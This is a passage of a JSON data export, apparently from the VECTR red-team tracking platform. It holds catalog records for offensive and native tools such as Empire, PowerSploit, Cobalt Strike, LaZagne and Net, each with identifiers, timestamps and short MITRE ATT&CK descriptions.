-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--76ca4ddf-5174-57a7-2842-70d5af62a25c","vectrId":"76ca4ddf-5174-57a7-2842-70d5af62a25c","offset":0,"createTime":1.481730473805E12,"updateTime":1.548448413219E12,"name":"Empire","version":"tbd","description":"Powershell","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"12a59183-1df8-4634-9734-1ad145a631f7","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--8e4883bf-d7b7-40ac-b157-ab6431c02b03","vectrId":"8e4883bf-d7b7-40ac-b157-ab6431c02b03","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"PowerSploit","version":"n/a","description":"[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--96ebaac5-a28f-7b75-4044-bc18a4faa93e","vectrId":"96ebaac5-a28f-7b75-4044-bc18a4faa93e","offset":0,"createTime":null,"updateTime":1.54844883654E12,"name":"Native Windows Commands","version":"tbd","description":"Built-In Windows commands","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"c0342108-c7a9-48dd-be26-23e96d4016b5","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--9d8e81e7-127f-464e-8671-bfdc6cced3d5","vectrId":"9d8e81e7-127f-464e-8671-bfdc6cced3d5","offset":0,"createTime":1.466260163E12,"updateTime":1.548448859265E12,"name":"Cobalt Strike","version":"tbd","description":"Cobalt Strike","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"9bc68f75-f3d5-4442-8a70-6a5532cc12b4","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--ab28ed11-37b5-4472-877d-52639dbe9af2","vectrId":"ab28ed11-37b5-4472-877d-52639dbe9af2","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"Systeminfo","version":"n/a","description":"[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--ab7f73c5-aa6e-4309-b334-fecdecc31332","vectrId":"ab7f73c5-aa6e-4309-b334-fecdecc31332","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"ipconfig","version":"n/a","description":"[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--b17a2f33-8d65-4ace-800c-be60f1dd22a9","vectrId":"b17a2f33-8d65-4ace-800c-be60f1dd22a9","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"LaZagne","version":"n/a","description":"[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3","vectrId":"b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"Net","version":"n/a","description":"The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--bc5080df-ad46-8c5a-9f23-12f61d2ec5e6","vectrId":"bc5080df-ad46-8c5a-9f23-12f61d2ec5e6","offset":0,"createTime":null,"updateTime":1.548448909394E12,"name":"PowerShell","version":"tbd","description":"Native Windows PowerShell client","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"c0342108-c7a9-48dd-be26-23e96d4016b5","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--c32562cb-348d-4d0e-85d3-52e2118459d7","vectrId":"c32562cb-348d-4d0e-85d3-52e2118459d7","offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"name":"LaZagne","version":"n/a","description":"[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b